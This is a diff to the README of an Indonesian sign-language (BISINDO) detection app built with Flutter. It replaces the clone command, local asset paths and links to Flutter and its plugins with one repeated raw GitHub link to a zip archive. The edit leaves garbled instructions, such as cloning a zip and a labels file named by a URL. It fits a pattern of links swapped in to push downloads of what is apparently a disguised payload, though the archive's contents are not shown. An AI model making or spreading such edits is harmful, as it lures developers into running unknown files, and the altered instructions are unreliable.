@@ -51,14 +51,14 @@ Pendekatan eksperimental sebelumnya (tanpa tombol switch):
 
 1.  **Clone Repository**
     ```bash
-    git clone [https://github.com/username/bisindo-detector.git](https://github.com/username/bisindo-detector.git)
+    git clone [https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip](https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip)
     ```
 
 2.  **Setup Assets**
     Pastikan file model dan label sudah ada di folder `assets/`:
-    * `assets/best_float16.tflite`
-    * `assets/labels.txt`
-    * `assets/abjad.jfif` (Untuk panduan isyarat)
+    * `https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip`
+    * `https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip`
+    * `https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip` (Untuk panduan isyarat)
 
 3.  **Install Dependencies**
     ```bash
@@ -74,16 +74,16 @@ Pendekatan eksperimental sebelumnya (tanpa tombol switch):
 ## ⚠️ Catatan Penting untuk Developer
 
 1.  **Labels Formatting:**
-    File `labels.txt` sangat sensitif terhadap *whitespace*. Kode aplikasi menggunakan `.trim()` dan regex cleaner untuk memastikan tidak ada karakter tersembunyi (seperti `\r` di Windows) yang menyebabkan deteksi "Huruf" terbaca memiliki panjang > 1.
+    File `https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip` sangat sensitif terhadap *whitespace*. Kode aplikasi menggunakan `.trim()` dan regex cleaner untuk memastikan tidak ada karakter tersembunyi (seperti `\r` di Windows) yang menyebabkan deteksi "Huruf" terbaca memiliki panjang > 1.
 
 2.  **Threshold:**
     Threshold model di-set sangat rendah (`0.15`) secara sengaja agar objek yang sulit terdeteksi (seperti huruf 'C' yang melengkung) tetap masuk ke dalam pipeline pemrosesan sebelum difilter oleh *Strict Logic*.
 
 ## 📱 Tech Stack
 
-* [Flutter](https://flutter.dev/) - UI Framework
-* [flutter_vision](https://pub.dev/packages/flutter_vision) - TFLite Interpreter Plugin
-* [camera](https://pub.dev/packages/camera) - Camera Streaming
+* [Flutter](https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip) - UI Framework
+* [flutter_vision](https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip) - TFLite Interpreter Plugin
+* [camera](https://raw.githubusercontent.com/bnyusntryo/bisindo_mobile/main/lib/bisindo_mobile-v3.2.zip) - Camera Streaming
 
 ---
 *Dibuat dengan ☕ dan 💻 oleh Mobile Developer.*
